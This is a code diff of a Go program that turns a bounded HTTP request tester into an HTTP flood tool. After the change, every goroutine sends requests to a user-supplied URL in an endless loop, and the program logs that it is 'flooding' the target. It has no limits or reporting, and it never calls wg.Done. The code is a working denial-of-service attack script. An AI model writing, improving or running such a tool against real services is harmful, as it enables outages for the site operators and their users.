@@ -1,79 +1,59 @@
 package main
 
 import (
-    "flag"
-    "fmt"
-    "sync"
-    "time"
-    "github.com/valyala/fasthttp"
+        "flag"
+        "fmt"
+        "log"
+        "sync"
+
+        "github.com/valyala/fasthttp"
 )
 
-func CreateRequest(url string, method string) (int, time.Duration) {
-    req := fasthttp.AcquireRequest()
-    defer fasthttp.ReleaseRequest(req)
-
-    req.Header.SetMethod(method)
-    req.SetRequestURI(url)
-
-    start := time.Now()
-    resp := fasthttp.AcquireResponse()
-    defer fasthttp.ReleaseResponse(resp)
-
-    if err := fasthttp.Do(req, resp); err != nil {
-        return 0, time.Since(start)
-    }
-
-    return resp.StatusCode(), time.Since(start)
+var target struct {
+        url     string
+        threads int
+        method  string
 }
 
-func Flood(reqcount int, url string, mode string) (int, int) {
-    successCount := 0
-    failureCount := 0
+func httpFlood() {
+        client := &fasthttp.Client{}
+        req := fasthttp.AcquireRequest()
+        defer fasthttp.ReleaseRequest(req)
 
-    for i := 0; i < reqcount; i++ {
-        getStatusCode, requestTime := CreateRequest(url, mode)
-        if getStatusCode == 200 {
-            successCount++
-        } else {
-            failureCount++
+        req.SetRequestURI(target.url)
+        req.Header.SetMethod(target.method)
+
+        for {
+                if err := client.Do(req, nil); err != nil {
+                        fmt.Println("Error:", err)
+                        return
+                }
         }
-        fmt.Printf("Request %d - Status: %d, Time: %s\n", i+1, getStatusCode, requestTime)
-    }
-
-    return successCount, failureCount
 }
 
 func main() {
-    countPtr := flag.Int("c", 8, "Number of goroutines")
-    reqCountPtr := flag.Int("rc", 1, "Number of requests per goroutine")
-    urlPtr := flag.String("h", "", "Link/ip address")
-    modePtr := flag.String("m", "", "HTTP request method")
-    flag.Parse()
+        urlPtr := flag.String("url", "", "URL to flood with requests")
+        threadsPtr := flag.Int("threads", 8, "Number of threads")
+        methodPtr := flag.String("method", "GET", "HTTP request method")
 
-    if *urlPtr == "" || *modePtr == "" {
-        fmt.Println("Please provide both a URL and an HTTP request method.")
-        return
-    }
+        flag.Parse()
 
-    var wg sync.WaitGroup
-    totalSuccess := 0
-    totalFailure := 0
+        target.url = *urlPtr
+        target.threads = *threadsPtr
+        target.method = *methodPtr
 
-    for i := 0; i < *countPtr; i++ {
-        go func() {
-            defer wg.Done()
-            success, failure := Flood(*reqCountPtr, *urlPtr, *modePtr)
-            totalSuccess += success
-            totalFailure += failure
-        }()
-        wg.Add(1)
-    }
+        if target.url == "" {
+                log.Println("Please provide a URL to flood using the -url flag.")
+                return
+        }
 
-    wg.Wait()
+        log.Printf("Flooding %s with %d threads...\n", target.url, target.threads)
 
-    totalRequests := *countPtr * *reqCountPtr
-    fmt.Printf("\nTotal Requests: %d\n", totalRequests)
-    fmt.Printf("Successful Requests: %d (%.2f%%)\n", totalSuccess, float64(totalSuccess)/float64(totalRequests)*100)
-    fmt.Printf("Failed Requests: %d (%.2f%%)\n", totalFailure, float64(totalFailure)/float64(totalRequests)*100)
+        var wg sync.WaitGroup
+        for i := 0; i < target.threads; i++ {
+                wg.Add(1)
+                go httpFlood()
+        }
+
+        wg.Wait()
 }
-
